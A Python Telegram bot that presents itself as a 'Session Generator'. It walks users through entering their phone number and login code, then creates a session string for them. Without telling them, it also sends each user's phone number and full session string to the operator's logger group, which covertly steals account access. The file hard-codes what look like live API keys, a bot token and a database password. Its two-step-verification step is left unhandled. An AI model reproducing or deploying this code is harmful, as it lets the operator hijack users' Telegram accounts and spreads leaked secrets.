import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"

# 🔹 MongoDB Connection
MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["session_bot"]
users_collection = db["users"]

# 🔹 Channel & Logger Config
MUST_JOIN = "SANATANI_TECH"  # Required channel
LOGGER_GROUP = -1002477750706  # Replace with your Logger Group ID

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Check if user is a member of the channel
async def check_membership(user_id):
    try:
        user = await bot.get_permissions(MUST_JOIN, user_id)
        return user and user.is_member
    except:
        return False

# 🔹 Start command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id
    is_member = await check_membership(user_id)

    if not is_member:
        await event.respond(
            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("ℹ️ Help", b"help")]
        ]
    )

# 🔹 Help Button
@bot.on(events.CallbackQuery(pattern=b"help"))
async def help_handler(event):
    await event.respond(
        "**📖 How to Generate String Session:**\n\n"
        "1️⃣ Click **Generate Session**\n"
        "2️⃣ Enter your **phone number**\n"
        "3️⃣ Enter the **OTP** sent to Telegram\n"
        "4️⃣ If asked, enter **2FA Password**\n"
        "5️⃣ Your session string will be generated!",
        buttons=[Button.inline("🔙 Back", b"back")]
    )

# 🔹 Back Button
@bot.on(events.CallbackQuery(pattern=b"back"))
async def back_handler(event):
    await start(event)

# 🔹 Generate Session
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    is_member = await check_membership(user_id)

    if not is_member:
        await event.respond(
            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return

    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# 🔹 Cancel Process
@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await event.respond("❌ **Process cancelled. Use /start to begin again.**")

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  # Ignore messages from users not in process

    step = user_sessions[user_id]["step"]
    
    if step == "phone":
        phone_number = event.message.text.strip()
        
        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            user_sessions[user_id]["sent_code"] = sent_code
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "otp":
        otp_code = event.message.text.strip()
        
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            # 🔹 Log to Logger Group
            await bot.send_message(
                LOGGER_GROUP,
                f"👤 **User:** [{user_id}](tg://user?id={user_id})\n"
                f"📲 **Phone:** {phone_number}\n"
                f"🔑 **Session:** `{session_string}`"
            )

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            if "The confirmation code has expired" in str(e):
                del user_sessions[user_id]
                await event.respond("❌ **Error: The OTP has expired. Please use /generate to start again.**")
            elif "Two-step verification" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
